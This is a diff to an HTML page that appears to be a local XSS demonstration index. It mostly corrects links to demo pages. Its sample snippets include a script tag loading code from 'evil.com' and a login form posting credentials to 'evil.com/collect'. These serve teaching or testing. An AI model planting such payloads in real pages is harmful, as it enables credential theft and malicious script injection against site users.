@@ -55,7 +55,7 @@ document.getElementsByTagName("*")[2].outerHTML
     <hr />
     <span> inline </span>
     <br /><br />
-    <a href="https://localhost:9381/xss/xss-inline.html" target=”_blank”>XSS inline</a>
+    <a href="/xss/xss-inline.html" target=”_blank”>XSS inline</a>
     <br /><br />
 
 
@@ -82,7 +82,7 @@ document.getElementsByTagName("*")[2].outerHTML
     <hr />
     <span> internal script loading</span>
     <br />
-    <a href="xss/xss-internal-load.html" target=”_blank”>Internal script load</a>
+    <a href="/xss/xss-internal-load.html" target=”_blank”>Internal script load</a>
 
 
     <br><br><textarea rows="3" cols="100">
@@ -94,7 +94,7 @@ document.getElementsByTagName("*")[2].outerHTML
   <hr />
   <span> remote script loading</span>
   <br />
-  <a href="xss/xss-remote-foreign-load.html" target=”_blank”>Remote Script Load</a>
+  <a href="/xss/xss-remote-foreign-load.html" target=”_blank”>Remote Script Load</a>
 
     <br><br><textarea rows="3" cols="100">
     <script src="https://evil.com/hacked.js"></script>
@@ -123,7 +123,7 @@ document.getElementsByTagName("*")[2].outerHTML
     <br /><br />
     <hr />
     <span> xss in forms </span><br />
-    <a href="https://localhost:9381/xss/TBD.js" target=”_blank”>Script with Forms</a>
+    <a href="https://localhost:9381/xss/xss-form.html" target=”_blank”>Script with Forms</a>
     <form method="POST" action="https://evil.com/collect">
       <label>Username</label>
       <input
@@ -142,7 +142,7 @@ document.getElementsByTagName("*")[2].outerHTML
       <br /><br />
       <hr />
       <span> java in pdf </span><br />
-      <a href="https://localhost:9381/xss/TBD.js" target=”_blank”> Script in PDF</a>
+      <a href="https://localhost:9381/xss/xss-pdf.html" target=”_blank”> Script in PDF</a>
 
       <br><br><textarea rows="10" cols="100">
       <object
@@ -158,9 +158,9 @@ document.getElementsByTagName("*")[2].outerHTML
       <hr />
       <span> Java in URL </span><br />
 
-      <a href="https://localhost:9381/xss/TBD.js" target=”_blank”> Script in URL</a>
+      <a href="https://localhost:9381/xss/xss-urljavascript.html" target=”_blank”> Script in URL</a>
       <br /><br />
-      <br><br><textarea rows="5" cols="60">
+      <br><br><textarea rows="10" cols="60">
         <a href="javascript: ...JS CODE...">js</a>
     </textarea
       >
